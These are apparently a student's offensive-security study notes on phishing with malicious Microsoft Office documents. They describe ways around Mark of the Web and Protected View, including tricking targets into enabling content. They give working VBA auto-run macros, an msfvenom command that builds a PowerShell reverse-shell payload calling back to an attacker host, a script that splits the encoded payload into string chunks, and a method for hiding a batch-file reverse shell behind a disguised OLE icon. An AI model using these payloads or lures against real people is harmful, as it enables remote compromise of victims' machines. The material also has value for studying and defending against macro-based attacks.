
# Macros  
Series of commands and instructions that are grouped together to accomplish a task programmatically.  
- Often used to manage dynamic content and link docs w/ external content.  
- Can be written from scratch in Visual Basic for Applications (VBA)  
	- Fully functional scripting language w/ full access to ActiveX objects & the Windows Script Host (similar to JS in HTML Apps)  

# Preparing the Attack

Consider:
	As malicious macros attacks are well-known, email providers and spam filters often filter out MS Office docs by default.
	- Can't simply send the mal-doc as an attachment.
 
To deliver payload & increase chances the target opens the doc, we could use a pretext & provide the doc in another way (like download link)

## Mark of the Web
If MS Office doc is successfully delivered to the target via email or download link
- File is tagged w/ *Mark of the Web* (MOTW)
	- Will open in *Protected View*
		- Disables all editing and mod settings in the doc & blocks execution of macros or embedded objects.
		- When opened, will show a warning w/ the option to *Enable Editing* (disables Protected View)
	- Not added to files on FAT32 formatted devices
	- Possible to avoid by providing it in container formats (7zip, ISO, IMG, etc)

### To bypass
- Get user to click on the *Enable Editing* button
	- Ex: Blur rest of doc and instruct to click to "unlock" it
- Rely on other macro-enabled MS Office programs that lack Protected View
	- Ex: Microsoft Publisher
		- Less frequently installed

Worse, MS implemented an outright blocking of macros that can only be unlocked by checking *Unblock* under file properties.
![[protected_view.png]]


# Leveraging MS Word Macros







W/in MS Word (likely similar in Excel)  
- Choose VIEW ribbon > Select Macros  
- Type name for macro > Create  
- Doc must be saved as either **.docm** or **.doc** formats.  
	- \*\**Avoid **.docx** format as it doesn't support macros  
  
  
Body of the macro is denoted by keywords _**Sub**_ and _**End Sub**_  
	- Sub procedures are very similar to a Function in VBA  
		- Difference is Sub procedures can't be used in expressions as they don't return any values.  
- _**'**_ = Comments  

```vbscript
Sub AutoOpen()
  
	MyMacro
  
End Sub
  
Sub Document_Open()
  
	MyMacro
  
End Sub
  
Sub MyMacro()
  
	CreateObject("Wscript.Shell").Run "cmd"

End Sub
```
	- AutoOpen() = Executed when a new doc is opened  
	- Document_Open() = Executed when a previously opened doc is reopened  
  
  
Once Doc is saved & reopened, a security warning requests to Enable Content (& effectively run the macros within)  
-  IRL, if the victim doesn't click the _Enable Content_, the attack will fail. So they'll need to be sufficiently encouraged to do so.  
  
  
For another payload (reverse shell), we can execute Metasploit's PS shellcode using a Base64 string.  
  
As VBA has a 255-char limit for literal strings, we'll have to split the commands into multiple lines and concatenate them.  
  
  
New macro (diff Lines 14 & 16):  
```vbscript
Sub AutoOpen()  
  
	MyMacro  
  
End Sub  
  
Sub Document_Open()  
  
	MyMacro  
  
End Sub  
  
	Sub MyMacro()  
	Dim Str As String  
  
	CreateObject("Wscript.Shell").Run Str  
  
End Sub
```


**msfvenom** payload:  
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f hta-psh -o /var/www/html/evil.hta
```

  
Using a python script to split up the payload ^:  
```python
str = "powershell.exe -nop -w hidden -e <msfvenom shellcode>"  
  
n = 50  
  
for i in range(0, len(str), n):  
print "Str = Str + " + '"' + str[i:i+n] + '"'
```

 
Updated macro:  
```vbscript
Sub AutoOpen()  
  
	MyMacro  
  
End Sub  
  
Sub Document_Open()  
  
	MyMacro  
  
End Sub  
  
Sub MyMacro()  
	Dim Str As String  
  
	Str = "powershell.exe -nop -w hidden -e <encoded powershell reverse"  
	Str = Str + "shell generated from msfvenom........."  
	...  
	...  
	...  
	Str = Str + "QA=="  
  
	CreateObject("Wscript.Shell").Run "Str"  
  
End Sub
```

  

### Object Linking and Embedding

**OLE** allows for abusing MS Office's document-embedding feature.  
  
**DDE** - Dynamic Data Exhange  
- Allows for the ability to execute arbitrary apps from within Office docs.  
*Patched since Dec 2017  
  
_.bat_ files are an older (still fully functional) format - replaced by VB & PS   
  
First we create the batch script:  
	POC will be to launch a cmd prompt:  
```bash
echo START cmd.exe > launch.bat
```

  
Then insert into a doc:  
- Open Word > Create new doc  
- Insert ribbon > Click on object menu
![[doc-object.png]]

- Create from file > Choose script  
	- Check Display as icon  
	- Change icon...  
		- Navigate to a desired binary  
			- Ex: C\:\\Program Files\\Microsoft Office\\root\\Office 16\\EXCEL  
		- Rename icon
![[doc-fromfile.png]]
	- Batch file is then embedded in the Word doc  
	- Save doc  
  
Once the icon is double clicked & the security warning is accepted, the batch file is launched.   
  
For the real exploit, replace the **cmd.exe** with the **msfvenom** payload ^^  
```powershell
START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBd......
```

Once the batch file is update, you'll need to re-embed it in the doc.  
  



